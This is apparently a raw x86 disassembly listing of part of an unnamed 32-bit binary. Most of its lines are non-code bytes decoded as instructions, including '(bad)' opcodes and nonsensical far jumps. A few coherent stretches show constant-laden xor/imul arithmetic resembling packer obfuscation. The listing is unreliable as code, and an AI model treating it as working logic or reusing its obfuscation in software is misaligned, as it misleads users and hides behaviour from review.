  4051ab:	addr16 (bad) 
  4051ad:	sar    BYTE PTR [ecx],0x83
  4051b0:	int3   
  4051b1:	cmp    ecx,DWORD PTR [eax+esi*2]
  4051b4:	push   ebp
  4051b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051b6:	add    DWORD PTR [edi-0x4eef9580],esi
  4051bc:	mov    dh,0xac
  4051be:	les    eax,FWORD PTR [esi]
  4051c0:	pop    ebx
  4051c1:	jo     0x40521c
  4051c3:	pop    ds
  4051c4:	lock out dx,eax
  4051c6:	inc    edi
  4051c7:	shl    BYTE PTR [ebx+0x46],1
  4051ca:	shl    esi,1
  4051cc:	shr    BYTE PTR [edi-0x7c],cl
  4051cf:	pop    ebx
  4051d0:	inc    esi
  4051d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051d2:	xchg   ecx,eax
  4051d3:	push   ecx
  4051d4:	jo     0x4051ee
  4051d6:	popf   
  4051d7:	(bad)  
  4051d8:	leave  
  4051d9:	sbb    dh,BYTE PTR [edi+esi*8+0x32]
  4051dd:	ins    BYTE PTR es:[edi],dx
  4051de:	and    al,0xd4
  4051e0:	enter  0x3b05,0x63
  4051e4:	pop    ss
  4051e5:	cmp    si,bx
  4051e8:	shl    BYTE PTR [ebx-0xc],0x2f
  4051ec:	or     eax,0x56bc0c45
  4051f1:	jb     0x405178
  4051f3:	(bad)  
  4051f4:	ror    DWORD PTR [ebx],1
  4051f6:	in     al,0x16
  4051f8:	(bad)  
  4051f9:	aam    0x43
  4051fb:	fwait
  4051fc:	pop    ebx
  4051fd:	inc    edx
  4051fe:	imul   esp,edx,0xc48c8a3c
  405204:	sub    ch,bl
  405206:	paddusw mm6,mm3
  405209:	cld    
  40520a:	jg     0x4051cc
  40520c:	pop    esp
  40520d:	and    eax,0xaf444c81
  405212:	adc    eax,0x782cfdb7
  405217:	or     al,0xec
  405219:	es shl ebx,1
  40521c:	std    
  40521d:	fdiv   DWORD PTR [ebx]
  40521f:	ja     0x405201
  405221:	sbb    eax,0xb5a4593c
  405226:	and    ebp,esp
  405228:	ins    DWORD PTR es:[edi],dx
  405229:	lahf   
  40522a:	test   bl,0x66
  40522d:	mov    ecx,0x55cf156a
  405232:	imul   ebp,DWORD PTR [esp+ebp*4],0x5b33e1fb
  405239:	pop    es
  40523a:	push   ebp
  40523b:	mov    ah,cl
  40523d:	mov    edi,0x1bc112df
  405242:	adc    eax,0x6b09998c
  405247:	adc    al,0x53
  405249:	dec    edi
  40524a:	push   ds
  40524b:	(bad)  
  40524c:	xlat   BYTE PTR ds:[ebx]
  40524d:	push   esi
  40524e:	in     al,0x1e
  405250:	or     ah,BYTE PTR [eax+0x1b]
  405253:	mov    ds:0xa644c7a6,al
  405258:	out    0x21,al
  40525a:	sub    edx,DWORD PTR [edx+0x4cb2998c]
  405260:	sti    
  405261:	mov    eax,ds:0x5d8a9ac
  405266:	and    DWORD PTR [eax-0x30cb97d3],esp
  40526c:	adc    DWORD PTR [esi+0x7c],ebx
  40526f:	fst    DWORD PTR [edx]
  405271:	pusha  
  405272:	jmp    0x8fb0:0x1d9ccab5
  405279:	fwait
  40527a:	inc    ecx
  40527b:	je     0x405224
  40527d:	outs   dx,BYTE PTR ds:[esi]
  40527e:	push   ebp
  40527f:	nop
  405280:	out    dx,al
  405281:	adc    dl,BYTE PTR [edx+0x55989a95]
  405287:	imul   esi,ebp,0x68
  40528a:	call   esi
  40528c:	int    0xe0
  40528e:	jl     0x405247
  405290:	inc    edx
  405291:	idiv   DWORD PTR [edi]
  405293:	jecxz  0x405241
  405295:	and    al,0x78
  405297:	js     0x405222
  405299:	popf   
  40529a:	aaa    
  40529b:	scas   eax,DWORD PTR es:[edi]
  40529c:	pop    ecx
  40529d:	inc    esp
  40529e:	mov    ah,0xf2
  4052a0:	sbb    DWORD PTR [ebp+esi*1+0x58],eax
  4052a4:	mov    esp,0x8f4edcc7
  4052a9:	push   0x46750e4b
  4052ae:	push   0xffffffc6
  4052b0:	stos   BYTE PTR es:[edi],al
  4052b1:	dec    ebx
  4052b2:	hlt    
  4052b3:	mov    bl,0x56
  4052b5:	pop    es
  4052b6:	adc    edx,eax
  4052b8:	ror    DWORD PTR [eax],1
  4052ba:	sbb    cl,BYTE PTR [esi+eax*4-0x3f]
  4052be:	xchg   ebp,eax
  4052bf:	sub    al,0x20
  4052c1:	retf   0xa05e
  4052c4:	mov    ebx,0x9094b465
  4052c9:	hlt    
  4052ca:	ss xchg ecx,eax
  4052cc:	out    dx,eax
  4052cd:	adc    dl,BYTE PTR [ebp-0x223e5648]
  4052d3:	xor    BYTE PTR [ebp+0xdbb44b],ch
  4052d9:	sbb    BYTE PTR [eax],bl
  4052db:	jmp    0x405286
  4052dd:	hlt    
  4052de:	pop    ds
  4052df:	das    
  4052e0:	sub    al,0x39
  4052e2:	shl    DWORD PTR [ecx-0x65b67d37],0x90
  4052e9:	push   eax
  4052ea:	and    ah,BYTE PTR [edx-0x2d]
  4052ed:	in     eax,dx
  4052ee:	inc    esp
  4052ef:	jp     0x405345
  4052f1:	dec    ebx
  4052f2:	cmc    
  4052f3:	mov    ss:0xc10be9a2,al
  4052f9:	xchg   edx,eax
  4052fa:	popf   
  4052fb:	cmp    ebx,DWORD PTR [ebx-0x4f]
  4052fe:	mov    ecx,0xa5189edf
  405303:	fimul  WORD PTR [edi]
  405305:	or     DWORD PTR [ecx+0x11aff982],edx
  40530b:	cmp    al,0xa9
  40530d:	add    eax,0x4cbffd72
  405312:	(bad)  
  405313:	inc    esp
  405314:	mov    bl,0x60
  405316:	jg     0x405333
  405318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405319:	cmp    edx,edx
  40531b:	ror    BYTE PTR [edi-0x54384cca],1
  405321:	xchg   ebp,eax
  405322:	mov    dh,BYTE PTR [edi-0x74]
  405325:	lods   eax,DWORD PTR ds:[esi]
  405326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405327:	pusha  
  405328:	add    al,0xf1
  40532a:	clc    
  40532b:	sbb    cl,BYTE PTR [eax-0x4b]
  40532e:	dec    edi
  40532f:	loope  0x405325
  405331:	or     BYTE PTR [edi],0xae
  405334:	(bad)  
  405335:	jne    0x4053a0
  405337:	sar    BYTE PTR [edi-0x33f65fd9],0xe8
  40533e:	add    al,0xe5
  405340:	and    al,0xc2
  405342:	(bad)  
  405343:	push   ss
  405344:	pop    edi
  405345:	add    al,0x94
  405347:	(bad)  
  405348:	aam    0x8
  40534a:	pop    ss
  40534b:	or     bh,BYTE PTR [ebx]
  40534d:	popf   
  40534e:	inc    edi
  40534f:	retf   
  405350:	xor    BYTE PTR [bx+di],0xa5
  405354:	sub    cl,BYTE PTR [edi-0x14]
  405357:	out    dx,eax
  405358:	dec    edi
  405359:	les    ebp,FWORD PTR [ebp-0x52]
  40535c:	call   0xb2bf:0x48f1101a
  405363:	push   ss
  405364:	mov    bh,0x5b
  405366:	mov    ebp,0x2560a7b0
  40536b:	add    BYTE PTR [ebx+edi*4-0x47],0x48
  405370:	(bad)  
  405371:	mov    al,BYTE PTR [eax]
  405373:	sbb    DWORD PTR [edx+0x3f],0xfffffff0
  405377:	pop    ds
  405378:	arpl   bx,si
  40537a:	imul   eax,DWORD PTR [esi],0x7c49fdde
  405380:	loope  0x405379
  405382:	or     edi,DWORD PTR [edi]
  405384:	add    DWORD PTR [edx],edi
  405386:	push   ss
  405387:	fsqrt  
  405389:	aas    
  40538a:	arpl   WORD PTR ds:0x879c344f,sp
  405390:	inc    edi
  405391:	bound  edx,QWORD PTR [edx+0x5cafd324]
  405397:	push   edi
  405398:	rol    BYTE PTR [esi+0x35],0xe1
  40539c:	repnz xor BYTE PTR [edi+0x705dd27c],ch
  4053a3:	mov    DWORD PTR [esi+eax*8+0x67],edx
  4053a7:	mov    cl,0xc
  4053a9:	pop    esp
  4053aa:	pop    ebp
  4053ab:	shl    DWORD PTR [ebp+0x73],0x5e
  4053af:	push   es
  4053b0:	scas   eax,DWORD PTR es:[edi]
  4053b1:	inc    BYTE PTR [eax]
  4053b3:	inc    ecx
  4053b4:	out    0xe,eax
  4053b6:	lods   al,BYTE PTR ds:[esi]
  4053b7:	ss adc al,0x9b
  4053ba:	inc    esp
  4053bb:	mul    DWORD PTR [esi]
  4053bd:	rol    BYTE PTR [ecx-0x64],1
  4053c0:	sub    al,0x6e
  4053c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053c3:	xchg   edx,eax
  4053c4:	add    al,0x23
  4053c6:	dec    ebp
  4053c7:	xchg   BYTE PTR [esi-0x49c32c98],dh
  4053cd:	jnp    0x4053d1
  4053cf:	push   0x21
  4053d1:	sbb    eax,0x2df88cbc
  4053d6:	mov    eax,ds:0xc1c57d9e
  4053db:	push   es
  4053dc:	leave  
  4053dd:	outs   dx,DWORD PTR ds:[esi]
  4053de:	(bad)  
  4053df:	sti    
  4053e0:	je     0x40538b
  4053e2:	dec    ecx
  4053e3:	xchg   esi,eax
  4053e4:	(bad)  
  4053e5:	sub    al,0x4e
  4053e7:	(bad)  
  4053e8:	sbb    edi,edx
  4053ea:	mov    dh,0xdb
  4053ec:	xchg   ecx,eax
  4053ed:	pop    ebp
  4053ee:	mov    ecx,0x87af7453
  4053f3:	fild   DWORD PTR [esi]
  4053f6:	xchg   BYTE PTR [edi],bh
  4053f8:	out    0x1f,al
  4053fa:	cmp    DWORD PTR [ebx-0x15a57539],eax
  405400:	inc    edi
  405401:	loope  0x405408
  405403:	mov    BYTE PTR [edi+edx*1-0x60],ch
  405407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405408:	repnz push ebx
  40540a:	pop    esi
  40540b:	and    al,0xe9
  40540d:	out    0x97,al
  40540f:	cmovp  edi,DWORD PTR [edx+0x7759fbbd]
  405416:	mov    DWORD PTR [esi+0x443f6d0f],eax
  40541c:	pop    ss
  40541d:	sbb    al,0xc6
  40541f:	aas    
  405420:	pop    esp
  405421:	(bad)  
  405422:	out    0xd2,al
  405424:	call   FWORD PTR [edx+0x52]
  405427:	data16 lock (bad) 
  40542c:	xchg   ecx,eax
  40542d:	pop    ebx
  40542e:	clc    
  40542f:	(bad)  
  405431:	inc    edi
  405432:	icebp  
  405433:	fwait
  405434:	inc    esi
  405435:	enter  0x1656,0x54
  405439:	fcomp  st(2)
  40543b:	pop    esi
  40543c:	dec    esi
  40543d:	inc    ebx
  40543e:	cdq    
  40543f:	iret   
  405440:	and    al,0xc3
  405442:	cli    
  405443:	out    0xcf,al
  405445:	imul   ecx,edx,0x22
  405448:	arpl   bp,di
  40544a:	sub    DWORD PTR [edx+0x37fbd578],ebp
  405450:	out    dx,al
  405451:	pop    es
  405452:	sub    BYTE PTR [eax-0x4b],dl
  405455:	pop    ebx
  405456:	cmp    ah,BYTE PTR [esi-0x12]
  405459:	push   0x83a66562
  40545e:	mov    ds:0xf93fc20d,eax
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x6f35fbb8]
  405484:	lea    edi,[eax+0x7e7e2bd0]
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054a7
  40548f:	sub    eax,0x3e5e1b0e
  405494:	push   eax
  405495:	enter  0x3e9a,0xd0
  405499:	lahf   
  40549a:	test   dl,ch
  40549c:	lods   al,BYTE PTR ds:[esi]
  40549d:	test   bl,0xc4
  4054a0:	hlt    
  4054a1:	adc    al,0x30
  4054a3:	sbb    eax,0xb6ac9e80
  4054a8:	aad    0x90
  4054aa:	sbb    al,0x3a
  4054ac:	in     al,dx
  4054ad:	ret    
  4054ae:	in     eax,0x0
  4054b0:	dec    ebp
  4054b1:	aad    0x59
  4054b3:	in     eax,dx
  4054b4:	cmp    ecx,ecx
  4054b6:	mov    eax,ds:0xbbcf7bfb
  4054bb:	and    edi,DWORD PTR [esi]
  4054bd:	cdq    
  4054be:	add    al,0x54
  4054c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054c1:	rol    BYTE PTR [ecx+0x76b0fac6],1
  4054c7:	xchg   ebp,eax
  4054c8:	xor    edi,DWORD PTR [edx+0x11]
  4054cb:	mov    ecx,0x19d12e71
  4054d0:	aaa    
  4054d1:	mov    ebx,0x92f0ee08
  4054d6:	mov    ch,ch
  4054d8:	lock pop ss
  4054da:	sub    eax,0x399391e8
  4054df:	xor    ebp,esi
  4054e1:	pop    edi
  4054e2:	mov    bh,BYTE PTR [edi-0x4f7757a0]
  4054e8:	xor    eax,0xcd085746
  4054ed:	mov    ch,0x26
  4054ef:	addr16 popa 
  4054f1:	xor    ah,BYTE PTR [edi]
  4054f3:	push   cs
  4054f4:	mov    bh,0xe1
  4054f6:	push   ds
  4054f7:	loop   0x40552d
  4054f9:	inc    esi
  4054fa:	xchg   ebp,eax
  4054fb:	add    eax,0x4f807ac5
  405500:	cmp    eax,DWORD PTR ds:0x50fbfd4b
  405506:	rcl    DWORD PTR [esi-0x6f],1
  405509:	leave  
  40550a:	cmc    
  40550b:	rol    DWORD PTR [ebp-0x2e],cl
  40550e:	aaa    
  40550f:	adc    ch,BYTE PTR [edx+esi*8]
  405512:	mov    al,ds:0x2425d742
  405517:	ins    BYTE PTR es:[edi],dx
  405518:	push   ecx
  405519:	add    ah,BYTE PTR [esi+0x9f515c4]
  40551f:	inc    edx
  405520:	mov    esi,0x2a7a0b5d
  405525:	call   0x130806b4
  40552a:	push   0x1bfa898d
  40552f:	outs   dx,BYTE PTR ds:[esi]
  405530:	gs icebp 
  405532:	dec    esi
  405533:	xor    bl,dh
  405535:	dec    ebx
  405536:	inc    eax
  405537:	ret    0xffc8
  40553a:	pop    ss
  40553b:	mov    BYTE PTR [edx],al
  40553d:	jecxz  0x405551
  40553f:	inc    ebx
  405540:	xchg   ebx,eax
  405541:	push   ss
  405542:	jl     0x405537
  405544:	repnz rcr BYTE PTR [eax+0x64cab253],0xaf
  40554c:	lock mov cl,0x90
  40554f:	add    ch,ch
  405551:	dec    eax
  405552:	sti    
  405553:	adc    eax,0x1c862487
  405558:	(bad)  
  405559:	std    
  40555a:	iret   
  40555b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40555c:	outs   dx,BYTE PTR ds:[esi]
  40555d:	sub    DWORD PTR [edi-0x32899476],ebx
  405563:	lahf   
  405564:	jl     0x405546
  405566:	sbb    edi,ebp
  405568:	pop    eax
  405569:	fwait
  40556a:	clc    
  40556b:	aad    0x57
  40556d:	inc    edx
  40556e:	xchg   ebp,eax
  40556f:	mov    BYTE PTR [ebp+0x123d8cf2],cl
  405575:	add    ch,BYTE PTR [eax]
  405577:	mov    ebp,0x7492ca25
  40557c:	inc    ebp
  40557d:	data16 out dx,al
  40557f:	push   es
  405580:	push   0xb287bafa
  405585:	imul   ecx,DWORD PTR [eax+ebx*8+0x5f2fa725],0x1c0737b
  405590:	jbe    0x40556f
  405592:	sub    al,0x70
  405594:	inc    ecx
  405595:	int    0x7b
  405597:	fisub  DWORD PTR [ebx-0x4699780f]
  40559d:	xchg   ebx,eax
  40559e:	pop    ds
  40559f:	adc    al,0x70
  4055a1:	mov    dl,0x1e
  4055a3:	retf   
  4055a4:	stc    
  4055a5:	sub    BYTE PTR [ecx],dh
  4055a7:	(bad)  [edx-0x8]
  4055aa:	xor    eax,0x2a0828b2
  4055af:	pop    edi
  4055b0:	or     al,0x66
  4055b2:	xor    DWORD PTR [ecx+0x102087e7],0x109b803e
  4055bc:	inc    esp
  4055bd:	jle    0x4055e5
  4055bf:	fld    DWORD PTR [edi]
  4055c1:	push   edx
  4055c2:	bound  ebp,QWORD PTR [edx]
  4055c4:	out    0xa0,eax
  4055c6:	ins    DWORD PTR es:[edi],dx
  4055c7:	in     al,dx
  4055c8:	dec    edx
  4055c9:	xchg   esp,eax
  4055ca:	icebp  
  4055cb:	pop    es
  4055cc:	mov    cl,0xc7
  4055ce:	popf   
  4055cf:	pop    esi
  4055d0:	push   es
  4055d1:	fistp  WORD PTR [ebx+ebp*8-0x2d]
  4055d5:	popa   
  4055d6:	or     DWORD PTR [ebx+0x51208b84],esp
  4055dc:	or     DWORD PTR [ebp*8+0x3fe7f481],ebx
  4055e3:	cld    
  4055e4:	sub    al,0xb0
  4055e6:	ret    0xa866
  4055e9:	ja     0x405598
  4055eb:	(bad)  [ebx]
  4055ed:	out    0xa2,al
  4055ef:	sub    eax,0xbc05cd59
  4055f4:	xor    ecx,DWORD PTR [ebx]
  4055f6:	int3   
  4055f7:	xchg   ecx,eax
  4055f8:	neg    DWORD PTR [edi-0x25]
  4055fb:	xor    dh,cl
  4055fd:	out    dx,al
  4055fe:	shl    DWORD PTR [esi],cl
  405600:	xchg   ebp,eax
  405601:	in     eax,0xa9
  405603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405604:	pop    es
  405605:	test   al,0x3b
  405607:	push   cs
  405608:	mov    DWORD PTR [esi+0x6b],0xa1412fac
  40560f:	mov    ch,0x84
  405611:	sub    al,0xec
  405613:	inc    edx
  405614:	jmp    0x4055bb
  405616:	and    dl,bl
  405618:	out    0xb9,al
  40561a:	retf   0x7449
  40561d:	inc    ebx
  40561e:	jmp    0xf4b0:0x7bcde2fd
  405625:	sti    
  405626:	sbb    eax,0xb201d0a1
  40562b:	xchg   esp,eax
  40562c:	jb     0x40567d
  40562e:	nop
  40562f:	ins    DWORD PTR es:[edi],dx
  405630:	add    BYTE PTR [edx],cl
  405632:	mov    ?,WORD PTR [ebx-0x7819fb7b]
  405638:	push   cs
  405639:	add    eax,0x2ce8484f
  40563e:	rcl    BYTE PTR [eax],1
  405640:	into   
  405641:	dec    ebx
  405642:	ret    
  405643:	push   ds
  405644:	cld    
  405645:	and    ah,BYTE PTR [eax+esi*4-0x2e]
  405649:	ins    DWORD PTR es:[edi],dx
  40564a:	add    BYTE PTR [edi],cl
  40564c:	jae    0x4055f7
  40564e:	jae    0x405629
  405650:	call   0x768621ff
  405655:	(bad)  
  405657:	lahf   
  405658:	pop    edi
  405659:	mov    eax,0xa6adcc8c
  40565e:	dec    edx
  40565f:	xchg   esi,eax
  405660:	(bad)  
  405661:	sub    edi,eax
  405663:	jg     0x4056a3
  405665:	jle    0x405606
  405667:	aaa    
  405668:	dec    ebp
  405669:	es push esi
  40566b:	loopne 0x4056bb
  40566d:	call   0x1f7927c8
  405672:	mov    ecx,0xd15de074
  405677:	test   DWORD PTR [esi-0xf5640ea],edx
  40567d:	adc    BYTE PTR [esi],bl
  40567f:	jnp    0x40564f
  405681:	dec    edi
  405682:	rol    ebp,cl
  405684:	or     DWORD PTR [esp+esi*2+0x74],ebp
  405688:	(bad)  
  405689:	push   ds
  40568a:	call   0x154c5012
  40568f:	add    al,0xcc
  405691:	pusha  
  405692:	lea    edx,[ecx]
  405694:	arpl   WORD PTR [ecx+0xb],dx
  405697:	mov    bl,0xfa
  405699:	scas   al,BYTE PTR es:[edi]
  40569a:	dec    esp
  40569b:	xor    DWORD PTR [esi+0x632f830d],edx
  4056a1:	daa    
  4056a2:	xchg   DWORD PTR [edi-0x3],edi
  4056a5:	pop    ecx
  4056a6:	sub    DWORD PTR ds:0x2f02babd,esi
  4056ac:	popa   
  4056ad:	out    dx,eax
  4056ae:	retf   
  4056af:	lods   eax,DWORD PTR ds:[esi]
  4056b0:	cmp    bl,ch
  4056b2:	sbb    ecx,DWORD PTR [eax+0x51]
  4056b5:	mov    ds:0x21e70a40,al
  4056ba:	test   eax,0xdbeba15a
  4056bf:	push   edx
  4056c0:	pop    edi
  4056c1:	inc    ecx
  4056c2:	mov    ds:0xadf12567,eax
  4056c7:	aam    0x83
  4056c9:	dec    edx
  4056ca:	fldcw  WORD PTR [esi+0x33]
  4056cd:	leave  
  4056ce:	add    BYTE PTR [ebp-0x6e],al
  4056d1:	jp     0x405706
  4056d3:	test   BYTE PTR [edi-0x75a91242],0xc4
  4056da:	test   al,0xc8
  4056dc:	ret    
  4056dd:	leave  
  4056de:	or     BYTE PTR [eax+0x7f92b65b],al
  4056e4:	jl     0x4056a9
  4056e6:	xchg   edx,eax
  4056e7:	sub    eax,0xdc694a09
  4056ec:	iret   
  4056ed:	fwait
  4056ee:	jo     0x40572c
  4056f0:	jl     0x4056be
  4056f2:	mov    ds:0xb1d72dbb,al
  4056f7:	cmp    DWORD PTR [edx],0x72
  4056fa:	lahf   
  4056fb:	ins    DWORD PTR es:[edi],dx
  4056fc:	lds    esi,FWORD PTR [edi]
  4056fe:	(bad)  
  405700:	sbb    eax,0xac6b1268
  405705:	jle    0x40569f
  405707:	push   ss
  405708:	clc    
  405709:	jmp    0x4056bf
  40570b:	mov    ebx,DWORD PTR [ecx-0x17c769be]
  405711:	xchg   esi,eax
  405712:	pushf  
  405713:	inc    edi
  405714:	cld    
  405715:	push   esi
  405716:	loope  0x405724
  405718:	dec    ecx
  405719:	(bad)  
  40571a:	cs push ecx
  40571c:	fistp  WORD PTR ds:0x140ff693
  405722:	popf   
  405723:	jecxz  0x4056d0
  405725:	mov    ebx,0xb04413c5
  40572a:	inc    ebp
  40572b:	sub    BYTE PTR [ebx+0x14bd9d1d],0xda
  405732:	mov    ebx,0x2d7f67
  405737:	loopne 0x40574f
  405739:	pushf  
  40573a:	dec    ecx
  40573b:	inc    esi
  40573c:	pop    eax
  40573d:	sbb    eax,esp
  40573f:	(bad)  [edi-0x1c]
  405742:	loope  0x4057a5
  405744:	jle    0x405744
  405746:	jns    0x4056f3
  405748:	dec    ecx
  405749:	inc    ebx
  40574a:	mov    esi,0x9cbabce9
  40574f:	jns    0x405762
  405751:	(bad)  
  405753:	ins    DWORD PTR es:[edi],dx
  405754:	out    0x26,eax
  405756:	loopne 0x4057cd
  405758:	adc    esi,DWORD PTR [edx+0x5a]
  40575b:	das    
  40575c:	hlt    
  40575d:	xchg   esi,eax
  40575e:	cmp    al,0x67
  405760:	(bad)  
  405761:	adc    BYTE PTR [esi-0x70],bl
  405764:	push   0x20
  405766:	ret    0x9253
  405769:	adc    dh,0x74
  40576c:	aad    0x73
  40576e:	shl    BYTE PTR [eax+ebx*1],0x32
  405772:	adc    cl,ah
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x99
  4057f5:	cmc    
  4057f6:	out    dx,eax
  4057f7:	xor    eax,0x7e7e363a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	jns    0x405864
  405802:	xchg   edi,eax
  405803:	arpl   WORD PTR [ebx-0x78],dx
  405806:	xor    eax,0xf56771d5
  40580b:	stos   DWORD PTR es:[edi],eax
  40580c:	cmp    al,0x43
  40580e:	sub    dl,bh
  405810:	push   ebp
  405811:	sahf   
  405812:	out    0xeb,eax
  405814:	popa   
  405815:	(bad)  
  405816:	data16 cmp al,0x24
  405819:	stc    
  40581a:	repnz inc esp
  40581c:	xchg   ebx,eax
  40581d:	jecxz  0x4057db
  40581f:	loop   0x40584c
  405821:	into   
  405822:	ins    BYTE PTR es:[edi],dx
  405823:	adc    eax,0xbb782eb0
  405828:	ss mov eax,0xc586b075
  40582e:	add    BYTE PTR [edx-0x2a7aba6e],ah
  405834:	mov    esi,ebx
  405836:	fistp  DWORD PTR [esi+0x705a84bf]
  40583c:	mov    ebp,0xf0989727
  405841:	ss (bad) 
  405844:	add    al,bl
  405846:	fst    QWORD PTR [ebp+eax*8-0xc427329]
  40584d:	inc    edi
  40584e:	xor    DWORD PTR [eax+ecx*1-0x3ad7bfea],ecx
  405855:	xchg   ecx,eax
  405856:	pop    eax
  405857:	jnp    0x4058d2
  405859:	loope  0x40584f
  40585b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40585c:	pop    eax
  40585d:	pushf  
  40585e:	pop    ecx
  40585f:	xchg   edx,eax
  405860:	xchg   esi,eax
  405861:	hlt    
  405862:	xchg   ecx,eax
  405863:	mov    ebx,0x241421b7
  405869:	fwait
  40586a:	sbb    ecx,eax
  40586c:	cmp    ah,BYTE PTR [ebx-0x6dc7872a]
  405872:	cmp    DWORD PTR [eax-0x499b773d],edi
  405878:	xchg   esp,eax
  405879:	mov    edi,0x525c301
  40587e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40587f:	arpl   WORD PTR [ebx],di
  405881:	sub    esi,DWORD PTR [esi+edx*8]
  405884:	clc    
  405885:	in     eax,dx
  405886:	add    eax,0x2d64ecd1
  40588b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40588c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40588d:	push   ss
  40588e:	fwait
  40588f:	ror    DWORD PTR [edx+esi*4-0x63a70b3],cl
  405896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405897:	mov    ebp,0x675f6f9f
  40589c:	xor    edi,DWORD PTR ds:0xd8e3a1f
  4058a2:	lods   eax,DWORD PTR ds:[esi]
  4058a3:	inc    ebp
  4058a4:	fisub  WORD PTR [esi+0x7d]
  4058a7:	sbb    DWORD PTR [esi],esi
  4058a9:	jg     0x405865
  4058ab:	mov    eax,0xc2941e22
  4058b0:	xchg   DWORD PTR [edi+0x1fed4994],ecx
  4058b6:	ins    BYTE PTR es:[edi],dx
  4058b7:	cmp    dh,BYTE PTR [edi+edi*1+0x200e8a3f]
  4058be:	je     0x4058cb
  4058c0:	fldl2t 
  4058c2:	leave  
  4058c3:	dec    ebp
  4058c4:	xchg   edi,eax
  4058c5:	arpl   bx,dx
  4058c7:	arpl   bx,bp
  4058c9:	add    ebx,DWORD PTR [eax+0xc]
  4058cc:	xchg   esi,eax
  4058cd:	mov    bh,0x4e
  4058cf:	mov    ds:0xbbf30567,eax
  4058d4:	sbb    eax,esi
  4058d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058d7:	mov    ecx,0x89f118d7
  4058dc:	xchg   esi,eax
  4058dd:	jnp    0x4058d8
  4058df:	sbb    BYTE PTR [edi+0x58],ch
  4058e2:	in     al,0x2b
  4058e4:	pop    es
  4058e5:	hlt    
  4058e6:	xchg   edi,eax
  4058e7:	jl     0x40591f
  4058e9:	push   esi
  4058ea:	mov    esp,0xba3b77e
  4058ef:	pop    esi
  4058f0:	push   edi
  4058f1:	or     edx,DWORD PTR [edi]
  4058f3:	add    cl,BYTE PTR [esi+eiz*8+0x25ee4391]
  4058fa:	push   cs
  4058fb:	inc    ecx
  4058fc:	xor    BYTE PTR [ecx+0x4d],bl
  4058ff:	jg     0x405973
  405901:	xor    al,0x7
  405903:	xchg   BYTE PTR [eiz*4-0x284e088b],ah
  40590a:	push   DWORD PTR [ecx]
  40590c:	dec    edi
  40590d:	xchg   esi,eax
  40590e:	or     eax,0x50e0bf89
  405913:	dec    esp
  405914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405915:	daa    
  405916:	pop    ds
  405917:	in     al,0x2f
  405919:	pop    edx
  40591a:	mov    dl,0xba
  40591c:	in     eax,dx
  40591d:	pop    ss
  40591e:	popa   
  40591f:	push   0xc
  405921:	inc    ebx
  405922:	add    bh,dh
  405924:	add    al,0x73
  405926:	jnp    0x40593b
  405928:	pop    esp
  405929:	rol    BYTE PTR [ebx-0x16765169],cl
  40592f:	leave  
  405930:	outs   dx,BYTE PTR ds:[esi]
  405931:	xchg   ebx,eax
  405932:	or     BYTE PTR cs:[eax-0x48],bl
  405936:	adc    eax,0x7c627007
  40593b:	sub    ch,BYTE PTR [esi-0x4fb3ef3f]
  405941:	scas   eax,DWORD PTR es:[edi]
  405942:	das    
  405943:	xlat   BYTE PTR ds:[ebx]
  405944:	(bad)  
  405945:	int    0xec
  405947:	leave  
  405948:	repnz push es
  40594a:	inc    ebx
  40594b:	test   eax,0x53b545ed
  405950:	xchg   esi,eax
  405951:	out    0xa7,al
  405953:	out    0x89,al
